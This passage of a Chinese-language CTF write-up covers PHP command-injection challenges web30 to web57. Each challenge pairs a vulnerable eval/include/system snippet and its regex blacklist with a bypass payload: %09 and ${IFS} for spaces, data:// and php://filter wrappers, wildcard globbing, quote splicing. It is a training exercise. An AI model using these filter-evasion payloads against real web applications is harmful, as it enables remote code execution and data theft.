class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>  &#125;<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>过滤了system flag php</p></li><li><pre><code class="hljs">/?c=echo `tac f*`;<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web31</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>过滤了flag system php cat sort shell  . 空格 ‘ </p></li><li><pre><code class="shell">/?c=echo`tac%09f*`;#也就是吧web30的空格用%09替换<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web32</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>又多过滤了echo，之前的echo走不通了</p></li><li><pre><code class="shell">/?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php；#解释：#php://filter是一个过滤器，这里通过指定base64编码的一个过滤器来读取flag.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- 对得到内容进行base64解码看到flag<br><br><span class="hljs-comment">### web33~36同web32</span><br><br><span class="hljs-comment">### web37</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>  &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="shell">/?c=data://text/plain,&lt;?php system(&quot;tac f*&quot;);?&gt;#用data伪协议,主要用于数据流的读取，传入的数据是php代码就会执行#嵌入文本data://text/plain#data://类似php://input，可用来控制输入流，与包含函数结合时，输入的data://流会被当成php文件执行。此题就与include()函数相结合，直接输命令。过滤了字符串flag，看源代码。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web38</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|php|file/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>  &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>在web37的基础上又过滤了php</p></li><li><p>将执行的代码换成短标签形式<?=?></p></li><li><pre><code class="shell">/?c=data://text/plain,&lt;?= system(&quot;tac f*&quot;);?&gt;<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web39</span><br><br>```php<br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<span class="hljs-comment">#把c和.php拼接起来了</span><br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>因为在短标签里面进行了一个?&gt;标签闭合了，所以不会受到php的影响</p></li><li><pre><code class="shell">/?c=data://text/plain,&lt;?= system(&quot;tac f*&quot;);?&gt;<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs r"><br><span class="hljs-comment">### web40</span><br><br>```php<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>eval语句执行命令，但过滤了很多东西</p></li><li><p>注意没有过滤掉英文的()</p></li><li><p>&#96;&#96;&#96;shell<br>&#x2F;?c&#x3D;print_r(scandir(reset(localeconv())));<br>#解释：<br>#因为英文的括号没有过滤，所以想到函数传参数</p></li></ul><h1 id="localeconv-返回一包含本地数字及本地货币信息的数组"><a href="#localeconv-返回一包含本地数字及本地货币信息的数组" class="headerlink" title="localeconv() 返回一包含本地数字及本地货币信息的数组"></a>localeconv() 返回一包含本地数字及本地货币信息的数组</h1><h1 id="reset-返回数组第一个单元的值，如果数组为空则返回false"><a href="#reset-返回数组第一个单元的值，如果数组为空则返回false" class="headerlink" title="reset() 返回数组第一个单元的值，如果数组为空则返回false"></a>reset() 返回数组第一个单元的值，如果数组为空则返回false</h1><h1 id="scandir-读取特定目录的数据"><a href="#scandir-读取特定目录的数据" class="headerlink" title="scandir() 读取特定目录的数据"></a>scandir() 读取特定目录的数据</h1><p>  合起来就是打印当前目录<br>  <figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><br>```shell<br>接下来就是想要获取flag.php里面的内容了<br>?c=show<span class="hljs-constructor">_source(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">reset</span>(<span class="hljs-params">localeconv</span>()</span>)))));<br>#解释：<br>#<span class="hljs-built_in">array</span><span class="hljs-constructor">_reverse()</span> 以相反的元素返回数组<br>#next<span class="hljs-literal">()</span> 将数组中的内部指针向前移动一位，并输出<br>#经过测试，不能循环使用next，next来访问到，也不能先<span class="hljs-keyword">end</span>再prev，只能将数组反过来然后next，就刚好可以得到flag.php的目录<br></code></pre></td></tr></table></figure></p><h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><ul><li>这题把我干沉默了</li><li>看大佬WP吧</li><li><a href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></li></ul><h3 id="Web42"><a href="#Web42" class="headerlink" title="Web42"></a>Web42</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">#解释：/dev/null 2&gt;&amp;1</span><br><span class="hljs-comment">#&gt; 代表重定向到哪</span><br><span class="hljs-comment"># /dev/null 空设备文件。所有写入的内容都会丢失，俗称黑洞</span><br><span class="hljs-comment"># 1表示stdout标准输出，系统默认值为1，&gt;/dev/null等同于1&gt;/dev/null</span><br><span class="hljs-comment"># 2表示stderr标准错误</span><br><span class="hljs-comment"># &amp;表示等同于，2&gt;&amp;1表示2的输出定向等同于1</span><br><span class="hljs-comment"># 1&gt;/dev/null 首先表示标准输出重定向到空设备文件也就是丢弃标准输出</span><br><span class="hljs-comment"># 2&gt;&amp;1 标准错误输出重定向等同于标准输出，因为之前标准输出已经被重定向到黑洞，所以也被丢弃</span><br><span class="hljs-comment"># 所以标准输出和标准错误都不会被输出</span><br><span class="hljs-comment"># 所以shell命令不会输出任何信息</span><br></code></pre></td></tr></table></figure><ul><li><pre><code class="shell">/?c=cat%09flag.php;查看源码找到flag#注意 使用了;来截断<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web43</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>  &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="shell">在web42的基础上过滤了;和cat/?c=tac flag.php%0a<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web44</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/;|cat|flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>  &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="hljs">在web43的基础上过滤了flag/?c=tac f*.php%0a<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web45</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>  &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="hljs">在web44的基础上过滤了空格/?c=tac%09f*.php%0a<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web46</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>  &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>&#96;&#96;&#96;<br>又多过滤了一个*号<br>&#x2F;?c&#x3D;tac%09????????%0a</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web47~<span class="hljs-number">49</span><br><br>- 同web46<br><br>### web50～<span class="hljs-number">51</span><br><br>- ```<br>  /?c=nl&lt;fla<span class="hljs-string">&#x27;&#x27;</span>g.php||ls<br></code></pre></td></tr></table></figure></li></ul><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><pre><code class="shell">/?c=nl$&#123;IFS&#125;/fla&#39;&#39;g||<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### Web53</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-variable">$d</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no&#x27;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="shell">/?c=ca\t$&#123;IFS&#125;fla\g.php%0a#可以用\来拼接<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web54</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="shell">#没想出来查了下wp#uniq()函数 用于去重 长见识了/?c=uniq$&#123;IFS&#125;f???.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web55</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="shell">#过滤了字母🤏#数字没有过滤#使用64来匹配/bin/base64这个命令，它的作用是将指定的文件内容以base64加密的形式输出/?c=/???/????64 ????.???<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs r"><br><span class="hljs-comment">### web56</span><br><br>```php<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;<br>        system($c);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="shell">#md练数字也过滤？#低头http://t.csdn.cn/BXUrd<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs r"><br><span class="hljs-comment">### web57</span><br><br>```php<br>// 还能炫的动吗？<br>//flag in 36.php<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c))&#123;<br>        system(&quot;cat &quot;.$c.&quot;.php&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>&#96;&#96;&#96;shell<br>基本啥都过滤<br>提示flag在36.php<br>所以要在linux中构造出36<br>但是我炫不动</p><h2 id="认输"><a href="#认输" class="headerlink" title="认输"></a>认输</h2><p>参考大佬WP：</p><h2 id="x2F-c-x3D"><a href="#x2F-c-x3D" class="headerlink" 